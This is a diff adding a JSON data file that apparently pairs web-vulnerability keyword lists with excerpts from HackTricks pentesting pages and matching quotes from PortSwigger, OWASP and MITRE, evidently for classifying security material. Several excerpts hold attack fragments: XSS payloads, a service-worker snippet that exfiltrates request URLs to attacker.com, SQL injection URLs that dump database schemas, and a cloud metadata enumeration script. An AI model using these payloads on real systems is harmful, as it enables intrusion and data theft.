@@ -1,0 +1,1031 @@
+{
+ "vocab": {
+  "idor": [
+   "bola",
+   "horizontal privilege",
+   "idor",
+   "insecure direct object reference",
+   "object id",
+   "ownership check",
+   "sequential id",
+   "uuid"
+  ],
+  "xss": [
+   "browser",
+   "cross-site scripting",
+   "dom",
+   "event handler",
+   "html",
+   "innerhtml",
+   "javascript",
+   "payload",
+   "reflected",
+   "script",
+   "sink",
+   "stored xss",
+   "xss"
+  ],
+  "sqli": [
+   " where ",
+   "boolean-based",
+   "code injection",
+   "database",
+   "dbms",
+   "orm",
+   "select ",
+   "sql",
+   "sql injection",
+   "sql query",
+   "time-based",
+   "union select"
+  ],
+  "ssti": [
+   "jinja",
+   "server-side template",
+   "ssti",
+   "template engine",
+   "template injection",
+   "twig"
+  ],
+  "ssrf": [
+   "callback",
+   "fetch a url",
+   "internal url",
+   "metadata service",
+   "outbound request",
+   "redirect to internal",
+   "server-side request forgery",
+   "ssrf",
+   "url",
+   "url fetch",
+   "url parser"
+  ],
+  "path_traversal": [
+   "../",
+   "directory traversal",
+   "file inclusion",
+   "lfi",
+   "null byte",
+   "path normalisation",
+   "path normalization",
+   "path traversal",
+   "rfi"
+  ],
+  "xxe": [
+   "dtd",
+   "external entity",
+   "xml external entity",
+   "xml parser",
+   "xxe"
+  ],
+  "smuggling": [
+   "content-length",
+   "desync",
+   "desynchronisation",
+   "http desync",
+   "http/1.1 pipelining",
+   "request smuggling",
+   "transfer-encoding"
+  ],
+  "deser": [
+   "deserialisation",
+   "deserialization",
+   "gadget",
+   "java serialization",
+   "pickle",
+   "serialized object",
+   "unmarshal"
+  ]
+ },
+ "packets": {
+  "idor": [
+   {
+    "page": "generic-methodologies-and-resources/pentesting-wifi/wifi-direct-and-iot-provisioning.md",
+    "title": "Wi-Fi Direct, Aware, AWDL and IoT Provisioning",
+    "section": "generic-methodologies-and-resources",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/generic-methodologies-and-resources/pentesting-wifi/wifi-direct-and-iot-provisioning.md",
+    "quotes": [
+     {
+      "quote": "Validate IDOR/BOLA only with two accounts/devices you control; a serial number is not proof of ownership.",
+      "class_terms": [
+       "bola",
+       "idor"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/access-control",
+     "quote": "If an attacker can use the `GET` (or another) method to perform actions on a restricted URL, they can bypass the access control that is implemented at the platform layer.",
+     "org": "portswigger.net"
+    }
+   },
+   {
+    "page": "pentesting-web/idor.md",
+    "title": "IDOR",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/idor.md",
+    "quotes": [
+     {
+      "quote": "IDOR (Insecure Direct Object Reference)\n\n{{#include ../banners/hacktricks-training.md}}\n\nIDOR (Insecure Direct Object Reference) / Broken Object Level Authorization (BOLA) appears when a web or API endpoint discloses or accepts a user\u2013controllable identifier that is used directly to access an internal object without verifying that the caller is authorized to access/modify that object.",
+      "class_terms": [
+       "insecure direct object reference"
+      ]
+     },
+     {
+      "quote": "Real-World Case Study \u2013 McHire Chatbot Platform (2025)\n\nDuring an assessment of the Paradox.ai-powered McHire recruitment portal the following IDOR was discovered:\n\n* Endpoint:",
+      "class_terms": [
+       "idor"
+      ]
+     },
+     {
+      "quote": "Auth Matrix, Forced Browse. \n* Github projects: bwapp-idor-scanner, Blindy (bulk IDOR hunting).",
+      "class_terms": [
+       "idor"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/access-control/idor",
+     "quote": "Insecure direct object references (IDOR) are a type of access control vulnerability that arises when an application uses user-supplied input to access objects directly.",
+     "org": "portswigger.net"
+    }
+   }
+  ],
+  "xss": [
+   {
+    "page": "pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+    "title": "BrowExt - XSS Example",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.md",
+    "quotes": [
+     {
+      "quote": "\"script-src 'self' 'unsafe-eval'; object-src 'self';\"\n\n\nHowever, 'unsafe-eval' does not authorize inline event handlers such as this payload's onerror; that requires 'unsafe-inline', a matching hash/nonce mechanism where applicable, or another executable gadget.",
+      "class_terms": [
+       "event handler",
+       "payload",
+       "script"
+      ]
+     },
+     {
+      "quote": "Classify the final execution context before assessing impact:<sup>[[8]](#references)[[9]](#references)</sup>\n Context | What successful injection normally gains | What to verify |\n Host-page DOM modified by a content script | JavaScript in the web page's main world, not automatic access to the content script's isolated-world privileges | Page CSP and whether a DOM or window.postMessage bridge forwards attacker data to the content script |\n Ordinary extension page (popup, options page, or reachable extension HTML) | The extension origin and the extension APIs available to that page | The extension-page CSP, manifest permissions, and any runtime-message handlers reachable from the page |\n Manifest V2 background page | A privileged extension page with a DOM | Whether attacker data reaches an HTML/code-execution sink through messaging or stored state |\n Manifest V3 service worker | No DOM, so this is a message/API or code-injection review rather than DOM XSS | Untrusted messages, unsafe URL/API arguments, and dynamic-code sinks |\n Page listed in sandbox.pages | Script allowed by the sandbox's separate CSP, but in a unique origin without extension APIs or direct access to non-sandboxed pages | Whether a privileged parent trusts messages from the sandbox and exposes an unsafe postMessage bridge |\n\nThe sandbox case is an important exception to the usual MV3 CSP rule.",
+      "class_terms": [
+       "javascript",
+       "script"
+      ]
+     },
+     {
+      "quote": "The problematic JavaScript, part of bookmarks.js, is detailed below:\n\njavascript\n$(\"#btAdd\").on(\"click\", function () {\n var bookmarkName = $(\"#txtName\").val()\n if (\n $(\".custom-button .label\").filter(function () {\n return $(this).text() === bookmarkName\n }).length\n )\n return false\n\n var bookmarkItem = $('<div class=\"custom-button\">')\n bookmarkItem.html('<span class=\"label\">' + bookmarkName + \"</span>\")\n bookmarkItem.append('<button class=\"remove-btn\" title=\"delete\">x</button>')\n bookmarkItem.attr(\"data-title\", bookmarkName)\n bookmarkItem.data(\"timestamp\", new Date().getTime())\n $(\"section.bookmark-container .existing-items\").append(bookmarkItem)\n persistData()\n})\n\n\nThis snippet fetches the value from the txtName input field and uses string concatenation to generate HTML, which is then appended to the DOM using jQuery\u2019s .append() function.<sup>[[2]](#references)</sup>\n\nChrome's extension CSP normally prevents inline script and eval-like execution.",
+      "class_terms": [
+       "javascript",
+       "script"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/contexts",
+     "quote": "More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example: \" autofocus onfocus=alert(document.domain) x=\" The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds x=\" to",
+     "org": "portswigger.net"
+    }
+   },
+   {
+    "page": "pentesting-web/xss-cross-site-scripting/README.md",
+    "title": "XSS (Cross Site Scripting)",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/README.md",
+    "quotes": [
+     {
+      "quote": "This is not trivial as modern browsers do not interpret the HTTP response body if the HTTP response status code is a 302, so just a cross-site scripting payload is useless.",
+      "class_terms": [
+       "browser",
+       "cross-site scripting",
+       "payload",
+       "script"
+      ]
+     },
+     {
+      "quote": "Escaping \\<script> tag\n\nIf your code is inserted within <script> [...] var input = 'reflected data' [...] </script> you could easily escape closing the <script> tag:\n\njavascript\n</script><img src=1 onerror=alert(document.domain)>\n\n\nNote that in this example we haven't even closed the single quote.",
+      "class_terms": [
+       "javascript",
+       "reflected",
+       "script"
+      ]
+     },
+     {
+      "quote": "Observe the stored-XSS primitive: the payload persists with the email and only requires a click to execute.\n\ntext\nList-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>\nList-Unsubscribe-Post:",
+      "class_terms": [
+       "javascript",
+       "payload",
+       "stored xss"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/content-security-policy",
+     "quote": "The CSP directive can specify a nonce (a random value) and the same value must be used in the tag that loads a script. If the values do not match, then the script will not execute. To be effective as a control, the nonce must be securely generated on each page load and not be guessable by an attacker. The CSP directive can specify a hash of the contents of the trusted script. If the hash of the actual script does not match the value specified in the directive, then the script will not execute. If the content of the script ever changes, then you will of course need to update the hash value",
+     "org": "portswigger.net"
+    }
+   },
+   {
+    "page": "pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+    "title": "Abusing Service Workers",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md",
+    "quotes": [
+     {
+      "quote": "For example:\n\njavascript\nvar sw =\n \"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//\"\n\n\nShadow Workers is a command-and-control framework dedicated to service-worker exploitation.<sup>[[4]](#references)</sup>\n\nService-worker update checks bypass the browser cache when the previous fetch occurred more than 24 hours ago, but that does not guarantee that a malicious worker disappears within 24 hours: the old worker can remain active until a changed script is fetched, installed, and activated.",
+      "class_terms": [
+       "browser",
+       "javascript",
+       "script"
+      ]
+     },
+     {
+      "quote": "Attack Creating a Service Worker\n\nIn order to exploit this vulnerability you need to find:\n\n- A way to upload arbitrary JS files to the server and a XSS to load the service worker of the uploaded JS file\n- A vulnerable JSONP request where you can manipulate the output (with arbitrary JS code) and a XSS to load the JSONP with a payload that will load a malicious service worker.",
+      "class_terms": [
+       "payload"
+      ]
+     },
+     {
+      "quote": "This is the code that must be uploaded to the vulnerable origin or returned through a vulnerable JSONP endpoint:\n\njavascript\nself.addEventListener(\"fetch\", (event) => {\n event.waitUntil(\n fetch(\"https://attacker.com/fetch_url/\" + encodeURIComponent(event.request.url), {\n mode:",
+      "class_terms": [
+       "javascript"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/cross-site-scripting/dom-based",
+     "quote": "DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML . This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts. To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript. The most common source for DOM XSS is the URL, which is typically accessed with the window.location object",
+     "org": "portswigger.net"
+    }
+   },
+   {
+    "page": "pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+    "title": "Chrome Cache to XSS",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.md",
+    "quotes": [
+     {
+      "quote": "Chrome Cache to XSS\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis is a browser-local cache abuse technique in Chrome: you first make the victim cache attacker-influenced content in their own browser, and later force a history navigation that restores the bytes from disk cache in a more dangerous context.",
+      "class_terms": [
+       "browser"
+      ]
+     },
+     {
+      "quote": "The original SECCON challenge writeup explains the chain in depth.<sup>[[1]](#references)</sup>\n\nThe technique revolves around the interaction of two cache types:\n\n- The back/forward cache (bfcache) stores a full page snapshot, including DOM and JavaScript heap.\n- The disk cache stores fetched responses/resources, but not the JavaScript heap.",
+      "class_terms": [
+       "javascript"
+      ]
+     },
+     {
+      "quote": "Chrome has changed bfcache eligibility and HTTP cache keying over time, so old CTF/browser-bug tricks can be version-sensitive.",
+      "class_terms": [
+       "browser"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+     "quote": "For JSON, verify that the Content-Type header is application/json and not text/html to prevent XSS. Output Encoding for \u201cCSS Contexts\u201d \u00b6 \u201cCSS Contexts\u201d refer to variables placed into inline CSS, which is common when developers want their users to customize the look and feel of their webpages. Since CSS is surprisingly powerful, it has been used for many types of attacks. Variables should only be placed in a CSS property value. Other \u201cCSS Contexts\u201d are unsafe and you should not place variable data in them. style > selector { property : $ varUnsafe ; } style > style > selector { property",
+     "org": "owasp.org"
+    }
+   }
+  ],
+  "sqli": [
+   {
+    "page": "pentesting-web/sql-injection/README.md",
+    "title": "SQL Injection",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/README.md",
+    "quotes": [
+     {
+      "quote": "An SQL injection is a security flaw that allows attackers to interfere with an application's database queries.",
+      "class_terms": [
+       "database",
+       "sql injection"
+      ]
+     },
+     {
+      "quote": "Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.\\\nTherefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:",
+      "class_terms": [
+       "sql injection",
+       "sql query"
+      ]
+     },
+     {
+      "quote": "0 UNION SELECT * FROM flag\n\nIt\u2019s possible to access the third column of a table without using its name using a query like the following:",
+      "class_terms": [
+       "select ",
+       "union select"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cwe.mitre.org/data/definitions/89.html",
+     "quote": "For example, consider using persistence layers such as Hibernate or Enterprise Java Beans, which can provide significant protection against SQL injection if used properly.",
+     "org": "mitre.org"
+    }
+   },
+   {
+    "page": "pentesting-web/sql-injection/ms-access-sql-injection.md",
+    "title": "MS Access SQL Injection",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/ms-access-sql-injection.md",
+    "quotes": [
+     {
+      "quote": "If the specified file exists, MS Access triggers an error message indicating that the database format is invalid:<sup>[[1]](#references)</sup>\n\nhttp://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\\boot.ini'%00\n\nAnother way to enumerate files consists into specifying a database.table item.",
+      "class_terms": [
+       "database",
+       "select ",
+       "union select"
+      ]
+     },
+     {
+      "quote": "TOP accepts as argument an integer, representing the number of rows to be returned.\n\nsql\n1' UNION SELECT TOP 3 attr FROM table%00\n\n\nJust like TOP you can use LAST which will get the rows from the end.",
+      "class_terms": [
+       "select ",
+       "union select"
+      ]
+     },
+     {
+      "quote": "Imagine that you have SQL injection in an MS Access database and know or have guessed a column named username.",
+      "class_terms": [
+       "database",
+       "sql injection"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://sqlite.org/lang_expr.html",
+     "quote": "A \"variable\" or \"parameter\" token specifies a placeholder in the expression for a value that is filled in at runtime using the sqlite3_bind() family of C/C++ interfaces.",
+     "org": "sqlite.org"
+    }
+   },
+   {
+    "page": "pentesting-web/sql-injection/mssql-injection.md",
+    "title": "MSSQL Injection",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mssql-injection.md",
+    "quotes": [
+     {
+      "quote": "Here's how to retrieve the schema, tables, and columns from the current database:\n\nsql\nhttps://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--\nIn situations where error-based vectors are used, it's crucial to provide an alias or a name.",
+      "class_terms": [
+       " where ",
+       "database",
+       "select ",
+       "union select"
+      ]
+     },
+     {
+      "quote": "SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='VIEW DATABASE PERFORMANCE STATE';",
+      "class_terms": [
+       " where ",
+       "database",
+       "select "
+      ]
+     },
+     {
+      "quote": "The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:\n\nsql\nhttps://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null\n\n\nTo check if you have the VIEW SERVER STATE permission, the following query can be used:\n\nsql\nSELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';",
+      "class_terms": [
+       " where ",
+       "select ",
+       "sql query"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://portswigger.net/web-security/sql-injection",
+     "quote": "Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters",
+     "org": "portswigger.net"
+    }
+   },
+   {
+    "page": "pentesting-web/sql-injection/mysql-injection/README.md",
+    "title": "MySQL injection",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/sql-injection/mysql-injection/README.md",
+    "quotes": [
+     {
+      "quote": "MySQL Union Based\n\nsql\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata\nUniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...",
+      "class_terms": [
+       " where ",
+       "select ",
+       "union select"
+      ]
+     },
+     {
+      "quote": "UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...",
+      "class_terms": [
+       " where ",
+       "select ",
+       "union select"
+      ]
+     },
+     {
+      "quote": "Example query built by the backend:\n\nsql\nSELECT tid, firstpost\nFROM threads\nWHERE MATCH(subject) AGAINST('+jack*' IN BOOLEAN MODE);",
+      "class_terms": [
+       " where ",
+       "select "
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
+     "quote": "If you are faced with parts of SQL queries that can't use bind variables, such as table names, column names, or sort order indicators (ASC or DESC)",
+     "org": "owasp.org"
+    }
+   }
+  ],
+  "ssti": [
+   {
+    "page": "pentesting-web/client-side-template-injection-csti.md",
+    "title": "Client Side Template Injection (CSTI)",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/client-side-template-injection-csti.md",
+    "quotes": [
+     {
+      "quote": "The SSTI can allow you to execute code on the remote server, the CSTI could allow you to execute arbitrary JavaScript code in the victim's browser.",
+      "class_terms": [
+       "ssti"
+      ]
+     },
+     {
+      "quote": "Testing for this vulnerability is very similar as in the case of SSTI, the interpreter expects a template and will execute it.",
+      "class_terms": [
+       "ssti"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://snyk.io/blog/thymeleaf-injection/",
+     "quote": "The vulnerability becomes exploitable when a developer allows user input to reach the expression engine directly. If this occurs, it indicates the developer is misusing the framework.",
+     "org": "snyk.io"
+    }
+   },
+   {
+    "page": "pentesting-web/ssti-server-side-template-injection/README.md",
+    "title": "SSTI (Server Side Template Injection)",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssti-server-side-template-injection/README.md",
+    "quotes": [
+     {
+      "quote": "This can potentially allow an attacker to inject malicious code into the name parameter, leading to server-side template injection.",
+      "class_terms": [
+       "server-side template",
+       "template injection"
+      ]
+     },
+     {
+      "quote": "This payload can contain Jinja template directives that enable the attacker to execute unauthorized code or manipulate the template engine, potentially gaining control over the server.",
+      "class_terms": [
+       "jinja",
+       "template engine"
+      ]
+     },
+     {
+      "quote": "To prevent server-side template injection vulnerabilities, developers should ensure that user input is properly sanitized and validated before being inserted into templates.",
+      "class_terms": [
+       "server-side template",
+       "template injection"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://jinja.palletsprojects.com/en/stable/sandbox/",
+     "quote": "It is possible to construct a relatively small template that renders to a very large amount of output, which could correspond to a high use of CPU or memory.",
+     "org": "palletsprojects.com"
+    }
+   }
+  ],
+  "ssrf": [
+   {
+    "page": "network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.md",
+    "title": "AEM - Adobe Experience Cloud",
+    "section": "network-services-pentesting",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-web/aem-adobe-experience-cloud.md",
+    "quotes": [
+     {
+      "quote": "5.2 SSRF to RCE (historical < 6.3)\n/libs/mcm/salesforce/customer.html;%0aa.css?checkType=authorize&authorization_url=http://127.0.0.1:4502/system/console \naem_ssrf2rce.py from aem-hacker automates the full chain.",
+      "class_terms": [
+       "ssrf",
+       "url"
+      ]
+     },
+     {
+      "quote": "Tooling\n\n* aem-hacker \u2013 Swiss-army enumeration script, supports dispatcher bypass, SSRF detection, default-creds checks and more. \n bash\n python3 aem_hacker.py -u https://target --host attacker-ip\n \n* Tenable WAS plugin 115065 \u2013 Detects QueryBuilder hash disclosure & encoded-slash bypass automatically (published Dec 2025).\n* Content brute-force \u2013 recursively request /_jcr_content.(json|html) to discover hidden components.\n* osgi-infect \u2013 upload malicious OSGi bundle via /system/console/bundles if creds available.",
+      "class_terms": [
+       "ssrf"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://datatracker.ietf.org/doc/html/rfc9110",
+     "quote": "As the Web grew, HTTP was extended to enclose requests and responses within messages, transfer arbitrary data formats using MIME-like media types, and route requests through intermediaries.",
+     "org": "ietf.org"
+    }
+   },
+   {
+    "page": "pentesting-web/ssrf-server-side-request-forgery/README.md",
+    "title": "SSRF (Server Side Request Forgery)",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssrf-server-side-request-forgery/README.md",
+    "quotes": [
+     {
+      "quote": "This setup exposes a vulnerability to Server-Side Request Forgery (SSRF), which can be exploited by merely specifying the desired IP address or domain name in the SNI field.",
+      "class_terms": [
+       "server-side request forgery"
+      ]
+     },
+     {
+      "quote": "If the library builds the request line from attacker-controlled filename data, embedded newlines may inject headers required by cloud metadata services.",
+      "class_terms": [
+       "metadata service"
+      ]
+     },
+     {
+      "quote": "Even if one remote driver only supports read access, another registered backend may still expose create/write callbacks.",
+      "class_terms": [
+       "callback"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://datatracker.ietf.org/doc/html/rfc9110",
+     "quote": "There are also intermediaries that can act on lower layers of the network protocol stack, filtering or redirecting HTTP traffic without the knowledge or permission of message senders.",
+     "org": "ietf.org"
+    }
+   },
+   {
+    "page": "pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md",
+    "title": "Cloud SSRF",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.md",
+    "quotes": [
+     {
+      "quote": "21600\" 2>/dev/null)\nHEADER=\"X-aws-ec2-metadata-token: $EC2_TOKEN\"\nURL=\"http://169.254.169.254/latest/meta-data\"\n\naws_req=\"\"\nif [ \"$(command -v curl)\" ]; then\n aws_req=\"curl -s -f -H '$HEADER'\"\nelif [ \"$(command -v wget)\" ]; then\n aws_req=\"wget -q -O - -H '$HEADER'\"\nelse\n echo \"Neither curl nor wget were found, I can't enumerate the metadata service :(\"\nfi\n\nprintf \"ami-id:",
+      "class_terms": [
+       "metadata service"
+      ]
+     },
+     {
+      "quote": "Which basically means that you can impersonate all the managed identities attached to a VM.\n>\n> When requesting an access token to the metadata endpoint, by default the metadata service will use the system assigned managed identity to generate the token, if there is any system assigned managed identity.",
+      "class_terms": [
+       "metadata service"
+      ]
+     },
+     {
+      "quote": "However, in case there is no system assigned managed identity and there are multiple user assigned managed identities, then the metadata service will return an error indicating that there are multiple managed identities and it's necessary to specify which one to use.\n>\n> The most complete way to enumerate the attached managed identities is usually via Azure WireServer / GoalState / ExtensionsConfig, because that platform configuration can expose the user assigned managed identities attached to the VM (for more info check: <https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-services/vms/index.html>).\n>\n> <details>\n>\n> <summary>Example Linux script to enumerate attached managed identities from the VM</summary>\n>\n> bash\n> #!/usr/bin/env bash\n> set -euo pipefail\n>\n> ws=\"http://168.63.129.16\"\n>\n> goal_xml=\"$(curl -fsS -H \"x-ms-version:",
+      "class_terms": [
+       "metadata service"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://cwe.mitre.org/data/definitions/441.html",
+     "quote": "As a result, the attacker can bypass access controls (such as firewalls) or hide the source of malicious requests, since the requests would not be coming directly from the attacker.",
+     "org": "mitre.org"
+    }
+   },
+   {
+    "page": "pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms.md",
+    "title": "SSRF Vulnerable Platforms",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms.md",
+    "quotes": [
+     {
+      "quote": "Modern SaaS products, self-hosted dashboards, Git services, on-call platforms, crawlers, and automation tools often let users register a callback URL and then send a server-side request to it later.",
+      "class_terms": [
+       "callback"
+      ]
+     },
+     {
+      "quote": "1. confirm blind SSRF with OAST\n2. point the URL to a harmless text endpoint such as https://icanhazip.com\n3. force the downstream processor to treat the response as text (for example mime_type=text/plain)\n4. look for the fetched response rendered inside the final artifact (generated image, OCR text, preview, moderation output, LLM response, PDF, etc.)\n\nThis turns a blind callback into response exfiltration without ever receiving the raw HTTP body directly.",
+      "class_terms": [
+       "callback"
+      ]
+     },
+     {
+      "quote": "DNS failures, TLS validation errors, 401 from metadata services, and scheme-parsing errors often prove that the backend made the request and reached internal-only destinations.",
+      "class_terms": [
+       "metadata service"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
+     "quote": "Cloud services such as AWS provide a REST\ninterface on `http://169.254.169.254/` where important configuration\nand sometimes even authentication keys can be extracted.",
+     "org": "owasp.org"
+    }
+   }
+  ],
+  "path_traversal": [
+   {
+    "page": "pentesting-web/file-inclusion/README.md",
+    "title": "File Inclusion/Path traversal",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/file-inclusion/README.md",
+    "quotes": [
+     {
+      "quote": "In PHP, URL-aware inclusion is disabled by default through allow_url_include.\\\nLocal File Inclusion (LFI):",
+      "class_terms": [
+       "file inclusion"
+      ]
+     },
+     {
+      "quote": "Discovered folders can be further probed for subdirectories or files using the same technique or traditional Local File Inclusion (LFI) methods.",
+      "class_terms": [
+       "file inclusion"
+      ]
+     },
+     {
+      "quote": "Java List Directories\n\nIt looks like if you have a Path Traversal in Java and you ask for a directory instead of a file, a listing of the directory is returned.",
+      "class_terms": [
+       "path traversal"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://docs.djangoproject.com/en/5.0/howto/static-files/",
+     "quote": "Also this helper function only serves the actual STATIC_ROOT folder; it doesn\u2019t perform static files discovery like django.contrib.staticfiles .",
+     "org": "djangoproject.com"
+    }
+   },
+   {
+    "page": "pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md",
+    "title": "LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md",
+    "quotes": [
+     {
+      "quote": "The later LFI includes the temporary backing file by its local pathname, so it parses the raw HTTP body stored before decompression.",
+      "class_terms": [
+       "lfi"
+      ]
+     },
+     {
+      "quote": "Although the compression wrapper itself is not gated by allow_url_fopen, the nested http:// fetch requires allow_url_fopen=On; allow_url_include is not required because the remote URL is read by file_get_contents() and the final include targets a local path.<sup>[[1]](#references)[[4]](#references)</sup>\n- A writable PHP temporary directory and an LFI sink allowed to include from that directory.\n- A path-disclosure primitive that reveals the live file, commonly named with a php prefix.",
+      "class_terms": [
+       "lfi"
+      ]
+     },
+     {
+      "quote": "PHP finishes copying, closes the stream, and removes the temporary file before it can be included.\n- Buffered output: the directory/path disclosure may not reach the attacker while request A is blocked; proxy buffering can defeat output-padding or flush-based synchronization.\n- Filesystem restrictions: a non-writable temp directory, open_basedir, container separation, or different worker filesystems can make the path unavailable to the LFI request.",
+      "class_terms": [
+       "lfi"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013",
+     "quote": "The path traversal vulnerability was introduced due to the new code change added for path normalization i.e., for URL paths to remove unwanted",
+     "org": "qualys.com"
+    }
+   },
+   {
+    "page": "pentesting-web/file-inclusion/lfi2rce-via-eternal-waiting.md",
+    "title": "LFI2RCE via Eternal waiting",
+    "section": "pentesting-web",
+    "url": "https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/file-inclusion/lfi2rce-via-eternal-waiting.md",
+    "quotes": [
+     {
+      "quote": "In a local file inclusion, if you manage to include that uploaded file, you will get RCE.",
+      "class_terms": [
+       "file inclusion"
+      ]
+     },
+     {
+      "quote": "If we manage to upload files and make the LFI never end, we will have \"enough time\" to brute-force uploaded files and find any of the ones uploaded.",
+      "class_terms": [
+       "lfi"
+      ]
+     },
+     {
+      "quote": "Once that behavior is confirmed in the lab or target version, repeatedly timing out upload requests can create thousands of candidate files, substantially increasing the probability of finding one through the LFI while using fewer long-lived connections.",
+      "class_terms": [
+       "lfi"
+      ]
+     }
+    ],
+    "partner": {
+     "url": "https://man7.org/linux/man-pages/man2/open.2.html",
+     "quote": "ENOTDIR A component used as a directory in path is not, in fact, a directory, or O_DIRECTORY was specified and path was not a directory.",
+     "org": "man7.org"
+    }
+   },
+   {
